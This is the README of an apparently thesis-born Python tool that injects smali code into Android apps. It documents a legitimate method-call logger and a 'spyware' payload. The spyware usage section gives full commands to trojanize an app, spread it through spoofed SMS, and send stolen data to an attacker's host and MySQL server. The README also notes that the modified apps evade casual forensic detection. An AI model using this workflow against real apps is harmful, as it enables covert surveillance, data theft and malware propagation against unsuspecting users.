## Automate assembly code (**smali**) injection within Android applications.
The initial ambition of this project was to automate stack trace injections within Android applications in order to facilitate my master thesis work. Being able to log and display applications' runtime method calls along with their returned value greatly helps in reverse engineering complex applications by providing an insight into their logic and workflow. 

Then, new features and payloads were progressively added in an attempt to create a framework fully capable of injecting any type of assembly code. Users familiar with Android development can easily implement compatible payloads. SCI is in charge of automating low level operation such as registers allocation, dependancie, type, etc. 

*Tampering Android applications has never been that easy!*

### Automation for a simpler world...
Code injections are performed at the assembly level (smali files) making the differenciation process between legit and modified applications complicated and time consuming - it would require considerable forensic work such as network, permissions, signature and code analysis -.

A high level overview of the steps involved during code injection is:

1. Disassembling the application.
2. Collecting relevant information about the application. 
    * Classes name.
    * Methods name.
    * Registers number and type.
    * etc.
3. Editing the AndroidManifest.xml to add permissions, services and broadcastReceivers (depending on the payload requirements).
4. Injecting and tweaking up the selected payload within the targeted method(s). Some Android libraries are also injected in order to defeat obfuscation.
5. Reassembling and signing the app with a valid self-signed certificate.

## Usage
### Examples:
#### Generic usage:

    $ python3 sci.py -a APP {search,payload}

    -a APP, --app APP  	Android application to trojanize

    positional arguments:
        search          search command - identifies the main activity
        payload         payload command

#### Search usage:

    $ python3 sci.py -a APP search

    -a APP, --app APP   Android application to trojanize

#### Payload usage:

    $ python3 sci.py -a APP payload [-d DESTINATION] [-k KEYWORDS] {logger,spyware}

    -a APP, --app APP   Android application to trojanize
    -d DESTINATION, --dest DESTINATION
                        the destination file or directoy for injection
    -k KEYWORDS, --keywords KEYWORDS
                        keywords (separated by ',') for injection filtering

    positional arguments:
        logger          logger command
        spyware         spyware command

##### Logger usage:

    $ python3 sci.py -a APP [-d DESTINATION] [-k KEYWORDS] logger

    -a APP, --app APP   Android application to trojanize
    -d DESTINATION, --dest DESTINATION
                        the destination file or directoy for injection
    -k KEYWORDS, --keywords KEYWORDS
                        keywords (separated by ',') for injection filtering

Launch the Android debugger *adb* using the following command to view application's runtime method calls:

    $ adb logcat | grep "::trace"

##### Spyware usage:

    $ sci.py -a APP payload [-d DESTINATION] [-k KEYWORDS] spyware [-h] -ppg PROPAGATE -rh RHOST

    -a APP, --app APP   Android application to trojanize
    -d DESTINATION, --dest DESTINATION
                        the destination file or directoy for injection
    -k KEYWORDS, --keywords KEYWORDS
                        keywords (separated by ',') for injection filtering
    -ppg PROPAGATE, --propagate PROPAGATE
                        spoofed SMS to send for the malware propagation
    -rh RHOST, --rhost RHOST
                        attacker's host/ip for stolen data transmission, e.g.
                        http://192.168.0.24/handler.php

*Note*: For optimal results, inject Spyware on the *onCreate()* method of the application main activity.

Server-side scripts to insert and store the stolen data sent to the attacker into a MySQL database are available under the *scripts* folder.

To enable the Spyware debugging mode set the *DEV_MODE* variable to *true* in *payloads\smali\spyware* line 7. Then launch the Android debugger *adb* using the following command:

    $ adb logcat | grep "::trace"

## Possible Improvements
- [ ] Create new payloads (e.g. a reverse shell).
- [ ] Optimise the source code.

## Project Information
This framework was developed in the context of my master thesis work in July 2015 and rewritten in 2017.
